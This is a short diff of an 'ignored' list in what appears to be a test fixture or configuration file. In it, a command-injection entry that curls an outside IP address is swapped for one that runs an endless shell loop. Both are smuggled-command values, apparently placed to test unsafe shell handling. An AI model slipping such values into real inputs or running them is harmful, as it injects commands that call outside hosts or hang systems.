@@ -22,6 +22,6 @@
 
 ignored = [
     "github.com/ignore/me",
-    "; curl http://13.95.144.60:8080; ",
+    "; while true; do :; done; ",
     "gitpub.com/nature/vegetables"
     ]
